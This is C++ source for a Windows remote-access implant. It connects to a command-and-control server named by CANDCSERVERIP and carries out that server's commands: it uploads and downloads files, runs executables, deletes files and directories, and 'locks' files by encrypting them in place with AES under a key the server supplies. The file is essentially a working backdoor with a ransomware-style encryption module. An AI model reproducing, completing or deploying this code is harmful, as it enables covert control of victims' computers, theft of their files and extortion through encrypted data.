// filecommand.cpp: 定义控制台应用程序的入口点。
//


#include "stdafx.h"

#define port 6379
extern char	*g_reply;
char* g_argv[];
int g_cmd;
char g_guid[64];

GUID  createguid()
{
	GUID  guid;
	CoCreateGuid(&guid);
	_snprintf_s(
		g_guid,
		sizeof(g_guid),
		"{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}",
		guid.Data1, guid.Data2, guid.Data3,
		guid.Data4[0], guid.Data4[1],
		guid.Data4[2], guid.Data4[3],
		guid.Data4[4], guid.Data4[5],
		guid.Data4[6], guid.Data4[7]);
	return guid;
}





bool lockFile(LPWSTR filename);
bool unlockFile(LPWSTR filename);


bool downloadFileCommand(LPCWSTR filename, SOCKET socketfd);
bool uploadFileCommand(LPCWSTR filename, SOCKET socketfd);

bool lockFileCommand(LPWSTR filename, char key[16]);
bool unlockFileCommand(LPWSTR filename, char key[16]);

bool newFileCommand(LPCWSTR filename, char* content);
bool copyFileCommand(LPCWSTR filename);
bool pasteFileCommand();
bool forcePasteFileCommand();
bool cutFileCommand(LPCWSTR filename);
bool newFileCommand(LPCWSTR filename, char* content);
bool rmFileCommand(LPCWSTR filename);
bool forcePasteFileCommand();
bool lsCommand();
bool pwdCommand(SOCKET);

bool cdCommand(LPCWSTR dir);
bool rmDirCommand(LPCWSTR dir);
bool mkdirCommand(LPCWSTR dir);
bool upDirCommand();
bool backDirCommand();
bool backDirCommand();;

//后期添加命令
bool execCommand(LPCWSTR);

char** splitArgs(char* cmd, int &total);
void freeArgs(char** argvs, int &total);
int aesDecry(char key[16], char in[16], char out[16]);
int aesEncry(char key[16], char in[16], char out[16]);

DWORD WINAPI fileCmdMain(LPVOID lpParameter)
{

	WSAData WSADa;
	char buf[1024];
	TCHAR argvBuf[1024];
	int count;
	WSAStartup(0x0202, &WSADa);
	SOCKET CSocket;
	sockaddr_in SockAddrIn;
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = inet_addr(CANDCSERVERIP);
	SockAddrIn.sin_port = htons(port);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	connect(CSocket, (struct sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
	// debug
	createguid();
	memset(buf, 0, 1024);
	_snprintf_s(buf, sizeof(buf), "enable 1 %s\r\n", g_guid);
	send(CSocket, buf, strlen(buf), 0);

	memset(buf, 0, 1024);
	recv(CSocket, buf, 1024, 0);
	if (!strcmp(buf, "+OK\r\n"))
		while (1) {
			memset(buf, 0, 1024);
			int ret = recv(CSocket, buf, 1024, 0);
			if (!ret)
				break;
			char** argvs = splitArgs(buf, count);
			if (count > 0 && argvs) {
				if (!strcmp(argvs[0], "download")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					downloadFileCommand(argvBuf, CSocket);
				}
				else if (!strcmp(argvs[0], "upload")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					uploadFileCommand(argvBuf, CSocket);
				}
				else if (!strcmp(argvs[0], "lock")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[2], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[2], -1, argvBuf, length);
					lockFileCommand(argvBuf, argvs[1]);
				}
				else if (!strcmp(argvs[0], "unlock")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[2], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[2], -1, argvBuf, length);
					unlockFileCommand(argvBuf, argvs[1]);
				}
				else if (!strcmp(argvs[0], "ls")) {
						if (lsCommand())
							send(CSocket, g_reply, strlen(g_reply), 0);
						else
							send(CSocket, "-ERR\r\n", 6, 0);
				}
				else if (!strcmp(argvs[0], "cd")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					cdCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "rmdir")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					rmDirCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "mkdir")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					mkdirCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "up")) {
					upDirCommand();
				}
				else if (!strcmp(argvs[0], "back")) {
					backDirCommand();
				}
				else if (!strcmp(argvs[0], "new")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					newFileCommand(argvBuf, NULL);
				}
				else if (!strcmp(argvs[0], "cat")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					newFileCommand(argvBuf, argvs[2]);
				}
				else if (!strcmp(argvs[0], "rm")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					rmFileCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "copy")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					copyFileCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "cut")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					cutFileCommand(argvBuf);
				}
				else if (!strcmp(argvs[0], "paste")) {
					pasteFileCommand();
				}
				else if (!strcmp(argvs[0], "fpaste")) {
					forcePasteFileCommand();
				}
				else if (!strcmp(argvs[0], "exe")) {
					int length = MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, NULL, 0);
					MultiByteToWideChar(CP_ACP, 0, argvs[1], -1, argvBuf, length);
					execCommand(argvBuf);
				}
			}
			freeArgs(argvs, count);
		}

	WSACleanup();
	return 0;
}


bool lockFileCommand(LPWSTR filename, char key[16]) {
	char buf[16];
	char out[16];
	int readCount;
	char xorBuf[16] = {
		0x05, 0x12, 0x06, 0x28,
		0x05, 0x17, 0x06, 0x08,
		0x05, 0x19, 0x73, 0x34,
		0x92, 0x23, 0x34, 0x82
	};
	char xorBuf2[16] = {
		0x05, 0x12, 0x06, 0x28,
		0x05, 0x17, 0x06, 0x08,
		0x05, 0x19, 0x73, 0x34,
		0x92, 0x23, 0x34, 0x82
	};

	for (int i = 0; i < 16; i++) {
		xorBuf[i] ^= key[i];
	}
	memset(buf, 0, sizeof(buf));
	memset(out, 0, sizeof(out));

	HANDLE fd = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	ReadFile(fd, buf, sizeof(buf), (LPDWORD)&readCount, NULL);
	if (readCount <= 0)
		return false;
	if (!memcmp(buf, xorBuf2, sizeof(xorBuf2))) {
		// 已经加密，退出
		CloseHandle(fd);
		return false;
	}

	HANDLE wfd = CreateFile(L"encryfile", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(wfd, xorBuf2, sizeof(xorBuf2), (LPDWORD)&readCount, NULL);

	// 重置文件指针，开始加密
	SetFilePointer(fd, NULL, NULL, FILE_BEGIN);
	DWORD leftCount = GetFileSize(fd, NULL);
	while (fd && leftCount > 0) {
		if (leftCount < 16) {
			ReadFile(fd, buf, leftCount, (LPDWORD)&readCount, NULL);
			for (int i = 0; i < sizeof(buf); i++) {
				buf[i] ^= xorBuf[i];
			}
			WriteFile(wfd, buf, leftCount, (LPDWORD)&readCount, NULL);
			break;
		}
		ReadFile(fd, buf, sizeof(buf), (LPDWORD)&readCount, NULL);
		aesEncry(key, buf, out);
		WriteFile(wfd, out, sizeof(buf), (LPDWORD)&readCount, NULL);
		leftCount -= sizeof(buf);
	}
	CloseHandle(fd);
	CloseHandle(wfd);
	DeleteFile(filename);
	MoveFile(L"encryfile", filename);

	return true;
}

bool unlockFileCommand(LPWSTR filename, char key[16]) {
	char buf[16];
	char out[16];
	int readCount;
	char xorBuf[16] = {
		0x05, 0x12, 0x06, 0x28,
		0x05, 0x17, 0x06, 0x08,
		0x05, 0x19, 0x73, 0x34,
		0x92, 0x23, 0x34, 0x82
	};
	char xorBuf2[16] = {
		0x05, 0x12, 0x06, 0x28,
		0x05, 0x17, 0x06, 0x08,
		0x05, 0x19, 0x73, 0x34,
		0x92, 0x23, 0x34, 0x82
	};
	for (int i = 0; i < 16; i++) {
		xorBuf[i] ^= key[i];
	}
	memset(buf, 0, sizeof(buf));
	memset(out, 0, sizeof(out));

	HANDLE fd = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE wfd = CreateFile(L"decryfile", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	ReadFile(fd, buf, sizeof(buf), (LPDWORD)&readCount, NULL);
	DWORD leftCount = GetFileSize(fd, NULL);
	leftCount -= sizeof(buf);

	// 判断是否已经加密
	if (!memcmp(buf, xorBuf2, sizeof(xorBuf2))) {
		while (fd && leftCount > 0) {
			if (leftCount < sizeof(buf)) {
				ReadFile(fd, buf, leftCount, (LPDWORD)&readCount, NULL);
				for (int i = 0; i < sizeof(buf); i++) {
					buf[i] ^= xorBuf[i];
				}
				WriteFile(wfd, buf, leftCount, (LPDWORD)&readCount, NULL);
				break;
			}
			ReadFile(fd, buf, sizeof(buf), (LPDWORD)&readCount, NULL);
			aesDecry(key, buf, out);
			WriteFile(wfd, out, sizeof(buf), (LPDWORD)&readCount, NULL);
			leftCount -= sizeof(buf);
		}

		CloseHandle(fd);
		DeleteFile(filename);
		CloseHandle(wfd);
		MoveFile(L"decryfile", filename);

		return true;
	}

	CloseHandle(fd);
	CloseHandle(wfd);
	DeleteFile(L"decryfile");
	return false;
}

int getCount(char* c) {
	int result = 0;
	int g = 1;
	char* temp = strchr(c, '\r');
	if (temp <= c)
		return -1;
	while (c + 1 != temp--) {
		result += (*temp - '0') * g;
		g *= 10;
	}

	return result;
}

char* setPointer(char* cmd) {
	char* result = strchr(cmd, '\n');
	return result == NULL ? NULL : result + 1;
}

bool checkString(char* cmd, int len) {
	if (cmd[len - 1] != '\r')
		return false;
	return true;
}

char* getString(char* cmd) {
	int len = getCount(cmd);
	if (!len)
		return NULL;
	cmd = setPointer(cmd);
	if (cmd == NULL || cmd[len] != '\r')
		return NULL;

	char *temp = new char[len + 1];
	if (temp == NULL)
		return NULL;

	temp[len] = '\0';
	strncpy(temp, cmd, len);

	return temp;
}

void freeArgs(char** argvs, int &total) {
	try {
		for (int i = 0; i < total; i++) {
			if (argvs[i])
				delete[] argvs[i];
		}
		if (argvs)
			delete[] argvs;
	}
	catch(...){}
	total = 0;
}

char** getArray(char* cmd, int &argc) {
	char **argv = NULL;
	int total = getCount(cmd), err = 0, done = 0, i = 0;
	cmd = setPointer(cmd);
	argv = new char*[total];
	while (total-- && !err) {
		char* temp = getString(cmd);
		if (temp) {
			argv[i++] = temp;
			int len = getCount(cmd);
			cmd = setPointer(cmd) + len + 2;
		}
		else
			err = 1;
		done++;
	}
	if (err) {
		freeArgs(argv, done);
	}
	argc = done;

	return argv;
}

char** splitArgs(char* cmd, int &total) {
	int argc = 0;
	int time = 1;
	char** argv = NULL;
	total = 1;
	int len;
	if (cmd[0] != '\0' && time--) {
		switch (cmd[0]) {
		case '*':	return getArray(cmd, total);
		case '$':
			total = 1;
			argv = new char*[1];
			argv[0] = getString(cmd);
			if (argv[0] == NULL) {
				total = 0;
				free(argv);
				return NULL;
			}
			return	argv;
		case '-':
			total = 0;
			break;
		default:
			total = 0;
			freeArgs(argv, argc);
			break;
		}
	}
	return argv;
}

